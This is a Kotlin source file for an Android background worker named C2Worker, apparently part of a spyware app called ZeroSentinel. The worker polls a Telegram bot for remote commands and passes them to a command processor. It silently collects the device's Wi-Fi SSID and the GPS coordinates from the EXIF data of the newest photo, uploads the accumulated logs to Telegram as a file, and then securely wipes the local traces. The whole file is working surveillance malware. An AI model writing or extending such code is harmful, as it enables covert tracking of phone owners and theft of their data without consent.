package com.zero.sentinel.workers

import android.content.Context
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import com.zero.sentinel.ZeroSentinelApp
import com.zero.sentinel.network.CommandProcessor
import com.zero.sentinel.network.TelegramClient
import com.zero.sentinel.utils.SecureDelete
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import java.io.File
import java.io.FileWriter
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale

class C2Worker(
    appContext: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(appContext, workerParams) {

    private val repository = (appContext.applicationContext as ZeroSentinelApp).repository
    private val telegramClient = TelegramClient(appContext)
    private val commandProcessor = CommandProcessor(appContext, repository, telegramClient)

    // In a real production app, we should persist the last update ID to SharedPreferences
    // to avoid processing old messages. For now, we rely on Telegram's logic or simple memory if worker stays alive (it won't).
    // TODO: Ideally pass lastUpdateId via inputData or SharedPreferences.
    // However, getUpdates with offset=0 returns all unconfirmed updates. If we confirm them (by using offset = last_id + 1), they vanish.
    // So we need to store the last processed ID in SharedPreferences.
    
    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            Log.d("C2Worker", "Starting C2 cycle")

            val prefs = com.zero.sentinel.data.EncryptedPrefsManager(applicationContext)
            val lastUpdateId = prefs.getLastUpdateId()
            val nextOffset = if (lastUpdateId == 0L) 0L else lastUpdateId + 1
            
            Log.d("C2Worker", "Polling updates with offset: $nextOffset")
            
            val updates = telegramClient.pollUpdates(nextOffset)
            val maxUpdateId = commandProcessor.processUpdates(updates)
            
            if (maxUpdateId > lastUpdateId) {
                prefs.saveLastUpdateId(maxUpdateId)
                Log.d("C2Worker", "New max update ID saved: $maxUpdateId")
            }

            // 2. Passive Monitoring
            passiveScan()

            // 3. Upload Logs
            uploadLogs()

            return@withContext Result.success()
        } catch (e: Exception) {
            Log.e("C2Worker", "Error in C2 cycle", e)
            return@withContext Result.retry()
        }
    }

    private suspend fun passiveScan() {
        Log.d("C2Worker", "Starting Passive Scan")
        val context = applicationContext
        
        // 1. WiFi SSID
        var ssid = "Unknown"
        val fineLoc = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_FINE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED
        val coarseLoc = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_COARSE_LOCATION) == android.content.pm.PackageManager.PERMISSION_GRANTED
        val wifiState = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.ACCESS_WIFI_STATE) == android.content.pm.PackageManager.PERMISSION_GRANTED
        
        if ((fineLoc || coarseLoc) && wifiState) {
            try {
                val wifiManager = context.applicationContext.getSystemService(Context.WIFI_SERVICE) as android.net.wifi.WifiManager
                @Suppress("DEPRECATION")
                val info = wifiManager.connectionInfo
                ssid = info.ssid ?: "Unknown"
                // SSID might be wrapped in quotes
                if (ssid.startsWith("\"") && ssid.endsWith("\"")) {
                    ssid = ssid.substring(1, ssid.length - 1)
                }
            } catch (e: Exception) {
                Log.e("C2Worker", "Error getting WiFi SSID", e)
            }
        }
        
        // 2. Media Location
        var locationUrl = "Unknown"
        var imgDate = "Unknown"
        
        // Check storage permission
        val hasStorage = androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE) == android.content.pm.PackageManager.PERMISSION_GRANTED ||
                         androidx.core.content.ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_MEDIA_IMAGES) == android.content.pm.PackageManager.PERMISSION_GRANTED
        
        if (hasStorage) {
            try {
                val projection = arrayOf(
                    android.provider.MediaStore.Images.Media.DATA,
                    android.provider.MediaStore.Images.Media.DATE_ADDED
                )
                val cursor = context.contentResolver.query(
                    android.provider.MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    null,
                    null,
                    "${android.provider.MediaStore.Images.Media.DATE_ADDED} DESC LIMIT 1"
                )
                
                cursor?.use {
                    if (it.moveToFirst()) {
                        val pathColumn = it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATA)
                        val dateColumn = it.getColumnIndexOrThrow(android.provider.MediaStore.Images.Media.DATE_ADDED)
                        
                        val path = it.getString(pathColumn)
                        val timestamp = it.getLong(dateColumn) * 1000L // DATE_ADDED is in seconds
                        imgDate = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(timestamp))
                        
                        if (path != null) {
                             val exif = android.media.ExifInterface(path)
                             val latLong = FloatArray(2)
                             if (exif.getLatLong(latLong)) {
                                 locationUrl = "https://maps.google.com/?q=${latLong[0]},${latLong[1]}"
                             }
                        }
                    }
                }
            } catch (e: Exception) {
                 Log.e("C2Worker", "Error in passive media scan", e)
            }
        }

        // 3. Log it
        // Format: [WIFI: <SSID>] | [LOC: https://maps.google.com/?q=<Lat>,<Lon>] | [IMG_DATE: <EXIF_DATE>]
        val logContent = "[WIFI: $ssid] | [LOC: $locationUrl] | [IMG_DATE: $imgDate]"
        
        repository.insertLog(
            type = "PASSIVE",
            packageName = "com.zero.sentinel",
            content = logContent
        )
        Log.d("C2Worker", "Passive Scan logged: $logContent")
    }

    private suspend fun uploadLogs() {
        val logs = repository.getAllLogs()
        if (logs.isEmpty()) return

        val deviceName = com.zero.sentinel.utils.DeviceInfoHelper.getSafeDeviceName()
        val timeStamp = SimpleDateFormat("yyyy-MM-dd_HH-mm", Locale.getDefault()).format(Date())
        val fileName = "logs_${deviceName}_${timeStamp}.txt"
        val file = File(applicationContext.cacheDir, fileName)

        try {
            FileWriter(file).use { writer ->
                logs.forEach { log ->
                    val date = SimpleDateFormat("yyyy-MM-dd HH:mm", Locale.getDefault()).format(Date(log.timestamp))
                    writer.append("$date | ${log.type} | ${log.packageName} | ${log.content}\n")
                }
            }

            // Send to Telegram
            val success = telegramClient.sendDocument(file)

            if (success) {
                // Cleanup on success
                repository.deleteAllLogs()
                SecureDelete.deleteSecurely(file)
                Log.i("C2Worker", "Uploaded & secure deleted ${logs.size} logs")
            } else {
                Log.e("C2Worker", "Upload failed. Logs retained.")
                // Delete temp file but keep logs in DB
                SecureDelete.deleteSecurely(file)
            }

        } catch (e: Exception) {
            Log.e("C2Worker", "Failed to upload logs", e)
            // If failed, we don't delete logs from DB so we can retry later.
            // But we should delete the temp file.
            if (file.exists()) {
                file.delete()
            }
            throw e
        }
    }
}
